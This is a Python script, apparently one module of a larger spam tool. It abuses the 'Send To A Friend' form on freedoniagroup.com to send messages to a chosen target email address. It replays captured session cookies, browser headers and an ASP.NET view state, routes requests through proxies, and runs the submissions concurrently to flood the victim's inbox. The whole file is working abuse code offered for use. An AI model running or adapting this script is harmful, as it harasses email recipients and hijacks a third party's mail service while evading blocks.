from os.path import basename

import requests

import module

cookies = {
    'ASP.NET_SessionId': 'ka21tfumoxj22enb1lhnbdus',
    'ReferrerHost': '3 www.google.com',
    'ReferrerId': 'SO-GOOGLE',
    '_gid': 'GA1.2.1598104015.1674738090',
    'hblid': 'VKfsVKF2wHUhSWjN562TC0NS6B0AjrbA',
    '_fbp': 'fb.1.1674738090739.692714320',
    '_okdetect': '%7B%22token%22%3A%2216747380907920%22%2C%22proto%22%3A%22about%3A%22%2C%22host%22%3A%22%22%7D',
    'olfsk': 'olfsk730124370194877',
    '_ok': '4909-749-10-2685',
    'wcsid': 'D4zTgEPx5lrRbOGL562TC0N660rbBkAS',
    '_okbk': 'cd5%3Davailable%2Ccd4%3Dtrue%2Cvi5%3D0%2Cvi4%3D1674739926840%2Cvi3%3Dactive%2Cvi2%3Dfalse%2Cvi1%3Dfalse%2Ccd8%3Dchat%2Ccd6%3D0%2Ccd3%3Dfalse%2Ccd2%3D0%2Ccd1%3D0%2C',
    '_gat': '1',
    '_ga': 'GA1.1.1768668275.1674738090',
    '_oklv': '1674740380464%2CD4zTgEPx5lrRbOGL562TC0N660rbBkAS',
    '_ga_H484FQE7NF': 'GS1.1.1674738090.1.1.1674740389.0.0.0',
}

headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    # 'Cookie': 'ASP.NET_SessionId=ka21tfumoxj22enb1lhnbdus; ReferrerHost=3 www.google.com; ReferrerId=SO-GOOGLE; _gid=GA1.2.1598104015.1674738090; hblid=VKfsVKF2wHUhSWjN562TC0NS6B0AjrbA; _fbp=fb.1.1674738090739.692714320; _okdetect=%7B%22token%22%3A%2216747380907920%22%2C%22proto%22%3A%22about%3A%22%2C%22host%22%3A%22%22%7D; olfsk=olfsk730124370194877; _ok=4909-749-10-2685; wcsid=D4zTgEPx5lrRbOGL562TC0N660rbBkAS; _okbk=cd5%3Davailable%2Ccd4%3Dtrue%2Cvi5%3D0%2Cvi4%3D1674739926840%2Cvi3%3Dactive%2Cvi2%3Dfalse%2Cvi1%3Dfalse%2Ccd8%3Dchat%2Ccd6%3D0%2Ccd3%3Dfalse%2Ccd2%3D0%2Ccd1%3D0%2C; _gat=1; _ga=GA1.1.1768668275.1674738090; _oklv=1674740380464%2CD4zTgEPx5lrRbOGL562TC0N660rbBkAS; _ga_H484FQE7NF=GS1.1.1674738090.1.1.1674740389.0.0.0',
    'Origin': 'https://www.freedoniagroup.com',
    'Referer': 'https://www.freedoniagroup.com/SendToAFriend.aspx?StudyIdNumber=3846&documentId=764784',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

params = {
    'StudyIdNumber': '3846',
    'documentId': '764784',
}


class ConcreteSpam(module.Spam):

    def check_success(self, response: requests.Response | None) -> bool:
        if response.text:
            return True
        else:
            return False

    def post(self, target) -> requests.Response | None:
        text = self.get_text(target=target)
        data = {
            '__EVENTTARGET': '',
            '__EVENTARGUMENT': '',
            '__VIEWSTATE': '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',
            '__VIEWSTATEGENERATOR': 'C0864C81',
            '__EVENTVALIDATION': 'p6DjW97m9d5szuUUpDm/tVTkWogpLov22MfLZftB3/1Qthrt7T51ZcJn3ZhETPa1RYKArKFlNJJpfahBKq+RMJ+GHOwCP0OautrMwibR3tUIiTP98mXCEdtf67miooLDAzhdutfhxe/YMKdUB3mcMCJl1vkTMh3hOQgKi55l9h/AyvVHe55sFiKfTxYInPa4z0jvad4eGgdQTSW/21hHFyuD7eA7VOxrMrFq9UnLxV0YMjANctV8/3mCn9oLPfUOm4x0uRD8ALEjaTyzgXSBJkrAlnua4IcsEC31YnohX/3SZCpvLBP1Tn/5qGbH6V5iJsmwhoA3iMe9pySkftWmSIyHR/OErNFo54FJ+QW2SXphDVNbp8PDmHekHEFKFuhxmem7A7wmA/x4h6R2lxAMEcAov9vof3Jv1WN+9+hTlxzUGsBV',
            'ctl00$SearchControl2$txtSearchTerm': '',
            'ctl00$SearchControl1$txtSearchTerm': '',
            'ctl00$ContentPlaceHolder1$FriendsNameTextBox': text,
            'ctl00$ContentPlaceHolder1$FriendsEmailTextBox': target,
            'ctl00$ContentPlaceHolder1$YourNameTextBox': text,
            'ctl00$ContentPlaceHolder1$YourEmailAddressTextBox': target,
            'ctl00$ContentPlaceHolder1$SubjectTextBox': text,
            'ctl00$ContentPlaceHolder1$CommentsTextBox': text,
            'ctl00$ContentPlaceHolder1$SubmitButton': 'Send Email',
        }

        response = requests.post(
            'https://www.freedoniagroup.com/SendToAFriend.aspx',
            params=params,
            cookies=cookies,
            headers=headers,
            data=data,
            proxies=self.get_proxies(), timeout=10
        )
        return response


def main():
    spam = ConcreteSpam(basename(__file__)[:-3])
    res = spam.send_post()
    if res:
        spam.run_concurrently()


if __name__ == '__main__':
    main()
